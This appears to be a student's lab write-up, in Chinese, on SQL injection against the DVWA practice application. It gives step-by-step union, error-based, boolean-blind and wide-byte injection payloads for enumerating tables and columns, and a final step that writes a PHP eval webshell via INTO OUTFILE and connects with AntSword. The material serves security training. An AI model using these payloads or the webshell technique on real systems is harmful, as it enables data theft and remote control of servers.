## 1.分别在前端和后端使用 Union 注入实现“dvwa 数据库 -user 表 - 字段 -first_name 数据”的注入过程，写清楚注入步骤。

- 前端输入1'  order by 1 #和1'  order by 2 #判断查询的列数
- 接着输入1' union all select database(),version() #得到数据库名
- 输入1' union all select 1,table_name from information_schema.tables where table_schema = database()#得到表名
- 输入1' union all select 1,column_name from information_schema.columns where table_schema = database() and table_name = 'users得到users表的字段名
- 输入1' union all select first_name from users#得到字段first_name的数据

## 2.分别在前端和后端使用报错注入实现“dvwa 数据库 -user 表 - 字段”的注入过程，写清楚注入步骤，并回答下列关于报错注入的问题：

- 输入1' and  extractvalue(1,concat(0x7e,database()))#得到数据库名
- 输入1' and  extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database() )))#得到表的个数
- 输入1' and  extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1)))#得到user表名
- 输入1' and  extractvalue(1,concat(0x7e,(select count(column_name) from information_schema.columns where table_schema = database() and table_name = 'users' )))#得到user表的字段数量
- 输入1' and  extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema = database() and table_name = 'users' limit 0,1)))#  并通过修改limit参数得到user表的每个字段





- 在 extractvalue 函数中，为什么’~'写在参数 1 的位置不报错，而写在参数 2 的位置报错？

  参数一是文件名称，是字符串形式，可以允许有~，参数二是路径，一般不包含~，所以会有语法错误

- 报错注入中，为什么要突破单引号的限制，如何突破？

  网站和防护设备会对单引号进行过滤，拦截单引号；使用十六进制来突破单引号的限制

- 在报错注入过程中，为什么要进行报错，是哪种类型的报错？

  extractvalue()函数报错会返回解析的SQL语句，属于函数语法报错

## 3.任选布尔盲注或者时间盲注在前端和后端实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。

选择布尔盲注

- 输入1' and length(database()) >5#  通过二分法判断数据库名的长度
- 输入1' and ascii(substr(database(),1,1))>100#  通过二分法得到数据库名的每个字符
- 输入1' and (select count(table_name) from information_schema.tables where table_schema=database())>100#  通过二分法得到数据库的表的数量
- 输入1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)>1# 通过二分法得到数据库的表名字符长度，通过修改limit参数得到数据库的每个表名长度
- 输入1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>100# 通过二分法以及修改limit参数得到数据库的每个表名
- 输入1' and (select count(column_name) from information_schema.columns where table_schema = database() and table_name = 'users' )>100# 通过二分法得到数据库的users表的字段数量
- 输入1' and (select length(column_name) from information_schema.columns where table_schema = database() and table_name = 'users' limit 0,1 )>100# 通过二分法以及修改limit参数得到数据库的users表的每个字段的字符长度
- 输入1' and ascii(substr((select column_name from information_schema.columns where table_schema = database() and table_name = 'users' limit 0,1 ),1,1))>100#通过二分法以及修改limit参数得到数据库的users表的每个字段，其他表的字段获取方法和users表一样

## 4.利用宽字节注入实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。

- 通过kobe%df%27 union all select database(),version()#得到数据库名
- 通过kobe%df%27 union all select 1,table_name from information_schema.tables where table_schema = database()#得到数据库的每个表名
- 通过kobe%df%27 union all select 1,column_name from information_schema.columns where table_schema = database() and table_name = (select table_name from information_schema.tables where table_schema = database() limit 3,1)  #以及修改limit参数得到每个表的所有字段

## 5.利用 SQL 注入实现 DVWA 站点的 Getshell，写清楚攻击步骤。

- 输入1' union select  1,"<?php eval($_POST['a']);"  into outfile '/var/www/html/test0.php
- 访问http://10.0.0.131:8080/test0.php成功，在站点目录生成test0.php文件
- 用蚁剑输入上一步链接，并输入密码a，即可成功Getshell







